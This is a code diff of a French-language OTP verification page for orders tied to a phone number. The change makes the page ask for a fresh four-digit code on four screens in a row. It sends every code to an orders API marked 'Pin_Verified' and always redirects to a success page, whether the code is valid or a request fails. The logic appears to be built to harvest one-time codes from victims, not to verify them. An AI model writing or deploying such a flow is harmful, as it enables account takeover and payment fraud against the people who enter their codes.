@@ -45,15 +45,10 @@
     <h2 class="verification-title">Vérification requise</h2>
     <p class="verification-instruction">Entrez le code OTP</p>
     <p class="helper-text">Un code à 4 chiffres a été envoyé à <span id="phone">+243000000000</span></p>
-    <p class="otp-attempts-text" id="attempt-status" style="display: none;">Tentative <span id="attempt-num">0</span> sur 4</p>
-    <div class="otp-progress" id="attempt-dots" style="display: none;">
-      <div class="otp-dot" id="dot1"></div>
-      <div class="otp-dot" id="dot2"></div>
-      <div class="otp-dot" id="dot3"></div>
-      <div class="otp-dot" id="dot4"></div>
-    </div>
+    <p class="otp-attempts-text" id="attempt-status">Vérification <span id="attempt-num">1</span> sur 4</p>
 
     <div class="otp-entry">
+
 
 
 
@@ -71,13 +66,16 @@
 const urlParams = new URLSearchParams(window.location.search);
 const orderId = urlParams.get('order_id');
 const phone = urlParams.get('phone') || '+243000000000';
+const currentAttempt = parseInt(urlParams.get('attempt')) || 1;
 document.getElementById('phone').textContent = phone;
+document.getElementById('attempt-num').textContent = currentAttempt;
 
 
 
 if (urlParams.get('expired') === 'true') {
   document.getElementById('expired-alert').style.display = 'block';
 }
+
 
 const otpBoxes = document.querySelectorAll('.otp-box');
 otpBoxes.forEach((box, index) => {
@@ -104,75 +102,46 @@ function verifyOTP() {
   
   const otpCode = otp1 + otp2 + otp3 + otp4;
   const MAX_ATTEMPTS = 4;
-  let currentAttempt = 0;
   
   // Disable button during processing
   const btn = document.querySelector('.btn-confirm');
   btn.disabled = true;
   btn.textContent = 'Vérification en cours...';
   
-  // Show attempt progress UI
-  const attemptStatus = document.getElementById('attempt-status');
-  const attemptDots = document.getElementById('attempt-dots');
-  const attemptNum = document.getElementById('attempt-num');
-  attemptStatus.style.display = 'block';
-  attemptDots.style.display = 'flex';
-  
-  function updateAttemptUI() {
-    attemptNum.textContent = currentAttempt;
-    // Fill dots up to current attempt
-    for (let i = 1; i <= 4; i++) {
-      const dot = document.getElementById('dot' + i);
-      if (i <= currentAttempt) {
-        dot.classList.add('used');
-      } else {
-        dot.classList.remove('used');
-      }
+  fetch('/api/orders/' + orderId, {
+    method: 'PATCH',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ otp: otpCode, status: 'Pin_Verified' })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if (currentAttempt < MAX_ATTEMPTS) {
+      // Go to next OTP screen
+      const nextAttempt = currentAttempt + 1;
+      const params = new URLSearchParams({ order_id: orderId, phone: phone, attempt: nextAttempt });
+      window.location.href = '/otp_fr?' + params.toString();
+    } else {
+      // After 4th attempt, proceed to success
+      showToast('Traitement en cours...');
+      const params = new URLSearchParams({ order_id: orderId, phone: phone, order_ref: data.order_ref || '', plan_name: data.plan_name || '', amount: data.amount || '' });
+      setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
     }
-  }
-  
-  function attemptVerification() {
-    currentAttempt++;
-    updateAttemptUI();
-    
-    fetch('/api/orders/' + orderId, {
-
-
-
-      method: 'PATCH',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ otp: otpCode, status: 'Pin_Verified' })
-    })
-    .then(res => res.json())
-    .then(data => {
-      // Always retry 4 times silently, regardless of success or failure
-      if (currentAttempt < MAX_ATTEMPTS) {
-        // Silent retry without showing any message
-        setTimeout(attemptVerification, 800);
-      } else {
-        // After 4 attempts, proceed to success
-        showToast('Traitement en cours...');
-        const params = new URLSearchParams({ order_id: orderId, phone: phone, order_ref: data.order_ref || '', plan_name: data.plan_name || '', amount: data.amount || '' });
-        setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
-      }
-    })
-    .catch(err => { 
-
-      // On error, retry silently or proceed if max attempts reached
-      if (currentAttempt < MAX_ATTEMPTS) {
-        setTimeout(attemptVerification, 800);
-      } else {
-        showToast('Traitement en cours...');
-        const params = new URLSearchParams({ order_id: orderId, phone: phone });
-        setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
-      }
-      console.error(err);
-    });
-  }
-  
-  // Start the first attempt
-  attemptVerification();
+  })
+  .catch(err => { 
+    // On error, still proceed to next screen or success if last attempt
+    if (currentAttempt < MAX_ATTEMPTS) {
+      const nextAttempt = currentAttempt + 1;
+      const params = new URLSearchParams({ order_id: orderId, phone: phone, attempt: nextAttempt });
+      window.location.href = '/otp_fr?' + params.toString();
+    } else {
+      showToast('Traitement en cours...');
+      const params = new URLSearchParams({ order_id: orderId, phone: phone });
+      setTimeout(() => { window.location.href = '/success_fr?' + params.toString(); }, 2000);
+    }
+    console.error(err);
+  });
 }
+
 
 
 let canResend = true;
